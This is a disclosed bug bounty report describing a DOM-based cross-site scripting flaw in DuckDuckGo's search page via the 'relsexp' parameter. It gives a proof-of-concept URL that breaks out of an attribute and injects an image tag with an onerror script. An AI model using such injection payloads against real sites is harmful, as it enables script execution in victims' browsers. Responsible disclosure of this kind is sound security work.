# DOM XSS on duckduckgo.com search

## Report Details
- **Report ID**: 876148
- **URL**: https://hackerone.com/reports/876148
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-16T18:33:39.971Z
- **Disclosed**: 2020-06-26T17:16:30.523Z

## Reporter
- **Username**: cujanovic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: duckduckgo

## Vulnerability Information
Hello,
The is a DOM XSS vulnerability on https://duckduckgo.com search through the `relsexp` parameter.

PoC URL: ` https://duckduckgo.com/?q=a&relsexp="><img src=/ onerror=alert(document.domain)>&ia=web`

Screenshot:
{F830875}

Video:
{F830880}

## Impact

The attacker can execute JS code.

## Attachments
- Screen_Shot_2020-05-16_at_20.21.38.png
- Screen_Recording_2020-05-16_at_20.29.00.mov
